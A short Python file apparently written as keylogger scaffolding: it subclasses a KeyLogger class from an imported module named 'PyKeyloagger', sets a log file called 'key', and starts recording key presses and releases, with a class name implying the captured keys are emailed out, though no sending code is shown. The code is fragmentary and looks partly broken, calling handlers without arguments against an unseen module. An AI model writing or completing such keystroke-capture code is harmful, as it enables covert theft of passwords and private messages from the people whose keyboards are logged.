from PyKeyloagger import KeyLogger

class LogKeyAndSendingEmail(KeyLogger):
    __log_file_name = 'key';
    def __init__(self):
        super().__init__(log_file_name=self.__log_file_name);
    def start_key_logger(self):
        super().on_press();
        super().on_release();
        super().start_log();

    
